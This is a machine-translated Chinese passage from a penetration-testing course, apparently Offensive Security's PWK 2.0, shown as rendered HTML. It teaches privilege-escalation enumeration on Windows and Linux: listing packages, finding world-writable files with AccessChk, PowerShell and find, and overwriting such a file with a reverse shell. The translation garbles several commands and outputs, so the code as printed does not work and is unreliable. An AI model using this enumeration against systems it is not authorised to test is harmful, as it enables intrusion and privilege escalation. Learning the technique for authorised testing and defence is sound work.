<div style="position:absolute;top:101858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的的组合</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HotFixID</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">InstalledOn</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息能为我们提供一个精确的</font></font></nobr></div>
<div style="position:absolute;top:101878;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指示目标 Windows 操作系统的安全状况。</font><font style="vertical-align: inherit;">根据这个输出，</font></font></nobr></div>
<div style="position:absolute;top:101897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个系统最近没有更新，这可能使它更容易被利用。</font></font></nobr></div>
<div style="position:absolute;top:101930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 Linux 的系统使用各种包管理器。</font><font style="vertical-align: inherit;">例如，基于 Debian 的 Linux</font></font></nobr></div>
<div style="position:absolute;top:101949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发行版使用 dpkg </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">473，</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而基于 Red Hat 的系统使用 rpm。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">474</font></font></font></nobr></div>
<div style="position:absolute;top:101982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要列出（通过 dpkg）在我们的 Debian 系统上安装的应用程序，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dpkg -l</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:102017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dpkg -l</font></font></font></b></nobr></div>
<div style="position:absolute;top:102034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所需=未知/安装/删除/清除/保留</font></font></nobr></div>
<div style="position:absolute;top:102051;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">状态=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend</font></font></nobr></div>
<div style="position:absolute;top:102068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)</font></font></nobr></div>
<div style="position:absolute;top:102085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">||/ 姓名    </font></font></nobr></div>
<div style="position:absolute;top:102085;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本    </font></font></nobr></div>
<div style="position:absolute;top:102085;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">架构描述</font></font></nobr></div>
<div style="position:absolute;top:102102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+++-====================-==================-======== ======-==============================</font></font></nobr></div>
<div style="position:absolute;top:102119;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ii acl    </font></font></nobr></div>
<div style="position:absolute;top:102119;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.2.52-3+b1 i386    </font></font></nobr></div>
<div style="position:absolute;top:102119;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问控制列表实用程序</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:102175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">472 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-quickfixengineering</font></font></font></nobr></div>
<div style="position:absolute;top:102195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">473 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux.die.net，2003 年），https://linux.die.net/man/1/dpkg</font></font></font></nobr></div>
<div style="position:absolute;top:102215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">474 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（马克尤因，2003 年），https://linux.die.net/man/8/rpm</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:102343;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="87"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 87 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:102376;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:103453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:103453;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:103453;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">528</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:102472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ii 添加用户    </font></font></nobr></div>
<div style="position:absolute;top:102472;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.115    </font></font></nobr></div>
<div style="position:absolute;top:102472;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部    </font></font></nobr></div>
<div style="position:absolute;top:102472;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加和删​​除用户和组</font></font></nobr></div>
<div style="position:absolute;top:102488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ii adwaita-icon-theme 3.22.0-1+deb9u1 全部    </font></font></nobr></div>
<div style="position:absolute;top:102488;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GNOME 的默认图标主题</font></font></nobr></div>
<div style="position:absolute;top:102505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ii alsa-utils    </font></font></nobr></div>
<div style="position:absolute;top:102505;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1.3-1    </font></font></nobr></div>
<div style="position:absolute;top:102505;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">i386    </font></font></nobr></div>
<div style="position:absolute;top:102505;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于配置和</font></font></nobr></div>
<div style="position:absolute;top:102522;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ii anacron    </font></font></nobr></div>
<div style="position:absolute;top:102522;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3-24    </font></font></nobr></div>
<div style="position:absolute;top:102522;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">i386    </font></font></nobr></div>
<div style="position:absolute;top:102522;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类似 cron 的程序</font></font></nobr></div>
<div style="position:absolute;top:102540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">蚂蚁    </font></font></nobr></div>
<div style="position:absolute;top:102540;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.9.9-1    </font></font></nobr></div>
<div style="position:absolute;top:102540;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部    </font></font></nobr></div>
<div style="position:absolute;top:102540;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 Java 的构建工具，如 ma</font></font></nobr></div>
<div style="position:absolute;top:102556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ii 可选    </font></font></nobr></div>
<div style="position:absolute;top:102556;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.9.9-1    </font></font></nobr></div>
<div style="position:absolute;top:102556;left:449"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部    </font></font></nobr></div>
<div style="position:absolute;top:102556;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 Java 的构建工具，如 ma</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:102573;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">二阿帕奇2    </font></font></b></nobr></div>
<div style="position:absolute;top:102573;left:303"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.25-3+deb9u4 i386    </font></font></b></nobr></div>
<div style="position:absolute;top:102573;left:562"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apache HTTP 服务器</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:102590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ii apache2-bin    </font></font></nobr></div>
<div style="position:absolute;top:102590;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.25-3+deb9u4 i386    </font></font></nobr></div>
<div style="position:absolute;top:102590;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apache HTTP 服务器（模块 a</font></font></nobr></div>
<div style="position:absolute;top:102607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ii apache2-data    </font></font></nobr></div>
<div style="position:absolute;top:102607;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.25-3+deb9u4 全部    </font></font></nobr></div>
<div style="position:absolute;top:102607;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apache HTTP 服务器（常见的</font></font></nobr></div>
<div style="position:absolute;top:102624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ii apache2-utils 2.4.25-3+deb9u4 i386    </font></font></nobr></div>
<div style="position:absolute;top:102624;left:562"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apache HTTP 服务器（实用程序 p</font></font></nobr></div>
<div style="position:absolute;top:102641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:102661;left:235"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 537 - 列出 Debian Linux 操作系统上所有已安装的软件包</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:102690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这证实了我们之前的预期：事实上，Debian 机器正在运行一个 Web 服务器。</font><font style="vertical-align: inherit;">在这</font></font></nobr></div>
<div style="position:absolute;top:102709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，它运行的是 Apache2。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:102744;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1.9 枚举可读/可写文件和目录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:102778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如我们之前提到的，访问限制不足的文件可能会创建一个漏洞</font></font></nobr></div>
<div style="position:absolute;top:102798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以授予攻击者提升的权限。</font><font style="vertical-align: inherit;">这通常发生在攻击者可以修改</font></font></nobr></div>
<div style="position:absolute;top:102817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在特权帐户的上下文下执行的脚本或二进制文件。</font></font></nobr></div>
<div style="position:absolute;top:102850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，非特权用户可读的敏感文件可能包含重要的</font></font></nobr></div>
<div style="position:absolute;top:102869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息，例如数据库或服务帐户的硬编码凭据。</font></font></nobr></div>
<div style="position:absolute;top:102902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于手动检查每个文件和目录的权限是不可行的，我们需要</font></font></nobr></div>
<div style="position:absolute;top:102921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽可能自动执行此任务。</font></font></nobr></div>
<div style="position:absolute;top:102954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有许多实用程序和工具可以在 Windows 平台上为我们自动执行此任务。</font></font></nobr></div>
<div style="position:absolute;top:102973;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 SysInternals </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">475 的</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AccessChk</font><font style="vertical-align: inherit;">可以说是最知名和最常用的工具</font></font></nobr></div>
<div style="position:absolute;top:102993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目的。</font></font></nobr></div>
<div style="position:absolute;top:103025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下面的示例中，我们将演示如何使用 AccessChk 查找文件不安全的文件</font></font></nobr></div>
<div style="position:absolute;top:103045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Program Files 目录中的权限。</font><font style="vertical-align: inherit;">请注意，目标二进制文件只是</font></font></nobr></div>
<div style="position:absolute;top:103064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为本练习的目的而创建。</font></font></nobr></div>
<div style="position:absolute;top:103097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具体来说，我们将枚举 Program Files 目录以搜索任何文件或目录</font></font></nobr></div>
<div style="position:absolute;top:103117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Everyone </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">476</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">写入</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限。</font></font></nobr></div>
<div style="position:absolute;top:103149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-u</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来抑制错误，使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-w</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来搜索写访问权限，以及使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-s</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来执行</font></font></nobr></div>
<div style="position:absolute;top:103169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">递归搜索。</font><font style="vertical-align: inherit;">其他选项也值得探索，因为此工具非常有用。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:103203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c:\Tools\privilege_escalation\SysinternalsSuite&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">accesschk.exe -uws "Everyone" "C:\Prog</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:103221;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ram文件”</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:103255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Accesschk v6.12 - 报告安全对象的有效权限</font></font></nobr></div>
<div style="position:absolute;top:103271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 (C) 2006-2017 Mark Russinovich</font></font></nobr></div>
<div style="position:absolute;top:103288;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sysinternals - www.sysinternals.com</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:103322;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RW C:\Program Files\TestApplication\testapp.exe</font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:103383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">475 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</font></font></font></nobr></div>
<div style="position:absolute;top:103403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">476 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:103531;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="88"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 88 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:103564;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:104641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:104641;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:104641;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">529</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:103660;left:254"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 538 - 列出指定目标中的所有可写文件和目录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:103689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上面的列表中，AccessChk 成功识别了一个全球可写的可执行文件。</font><font style="vertical-align: inherit;">如果</font></font></nobr></div>
<div style="position:absolute;top:103708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此文件将由特权用户或服务帐户执行，我们可以尝试覆盖</font></font></nobr></div>
<div style="position:absolute;top:103728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它带有我们选择的恶意文件，例如反向 shell，以提升我们的权限。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:103747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">稍后将在本模块中介绍一个类似的工作示例。</font></font></nobr></div>
<div style="position:absolute;top:103780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们也可以使用 PowerShell 实现相同的目标。</font><font style="vertical-align: inherit;">这在我们可能的情况下很有用</font></font></nobr></div>
<div style="position:absolute;top:103799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无法在我们的目标系统上传输和执行任意二进制文件。</font></font></nobr></div>
<div style="position:absolute;top:103832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 命令本身（如下面的清单 539 所示）可能看起来有些复杂，因此</font></font></nobr></div>
<div style="position:absolute;top:103851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将介绍选项。</font></font></nobr></div>
<div style="position:absolute;top:103884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们使用的主要 cmdlet 是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-Acl</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它检索给定文件的所有权限或</font></font></nobr></div>
<div style="position:absolute;top:103904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录。</font><font style="vertical-align: inherit;">但是，由于 Get-Acl 不能递归运行，我们也使用了</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-ChildItem</font></font></font></b></nobr></div>
<div style="position:absolute;top:103923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet 首先枚举 Program Files 目录下的所有内容。</font><font style="vertical-align: inherit;">这将有效地检索</font></font></nobr></div>
<div style="position:absolute;top:103942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们目标目录中的每个对象以及所有相关的访问权限。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:103962;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-match</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志的</font><i><font style="vertical-align: inherit;">AccessToString</font></i><font style="vertical-align: inherit;">属性</font><font style="vertical-align: inherit;">将结果缩小到特定访问</font></font></nobr></div>
<div style="position:absolute;top:103981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正在寻找的属性。</font><font style="vertical-align: inherit;">在我们的例子中，我们正在搜索任何可以修改（Modify）的对象</font></font></nobr></div>
<div style="position:absolute;top:104001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由Everyone 组的成员。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:104035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Tools\privilege_escalation\SysinternalsSuite&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-ChildItem "C:\Program Files" -R</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:104052;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">诅咒| </font><font style="vertical-align: inherit;">获取-ACL | </font><font style="vertical-align: inherit;">?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:104103;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录：C:\Program Files\TestApplication</font></font></nobr></div>
<div style="position:absolute;top:104154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小路    </font></font></nobr></div>
<div style="position:absolute;top:104154;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有者    </font></font></nobr></div>
<div style="position:absolute;top:104154;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用权</font></font></nobr></div>
<div style="position:absolute;top:104171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:104171;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----    </font></font></nobr></div>
<div style="position:absolute;top:104171;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:104188;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">testapp.exe BUILTIN\Administrators 每个人都允许修改、同步...</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:104208;left:203"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 539 - 使用 PowerShell 列出指定目标中的所有可写文件和目录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:104237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，输出与 AccessChk 的输出相同。</font><font style="vertical-align: inherit;">此命令序列允许</font></font></nobr></div>
<div style="position:absolute;top:104256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他格式选项。</font></font></nobr></div>
<div style="position:absolute;top:104289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Linux 操作系统上，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find</font></font></font></b><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 477</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来识别具有不安全权限的文件。</font></font></nobr></div>
<div style="position:absolute;top:104322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下面的示例中，我们正在搜索目标上当前用户可写的每个目录</font></font></nobr></div>
<div style="position:absolute;top:104341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统。</font><font style="vertical-align: inherit;">我们搜索整个根目录 (/) 并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-writable</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数来指定</font></font></nobr></div>
<div style="position:absolute;top:104361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们感兴趣的属性。我们也使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-type d</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来定位目录，我们过滤错误</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:104381;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2&gt;/开发/空</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:104415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find / -writable -type d 2&gt;/dev/null</font></font></font></b></nobr></div>
<div style="position:absolute;top:104432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/local/james/bin</font></font></nobr></div>
<div style="position:absolute;top:104449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/local/james/bin/lib</font></font></nobr></div>
<div style="position:absolute;top:104466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/proc/16195/task/16195/fd</font></font></nobr></div>
<div style="position:absolute;top:104483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/proc/16195/fd</font></font></nobr></div>
<div style="position:absolute;top:104500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/proc/16195/map_files</font></font></nobr></div>
<div style="position:absolute;top:104517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/家/学生</font></font></nobr></div>
<div style="position:absolute;top:104534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/家/学生/.gconf</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
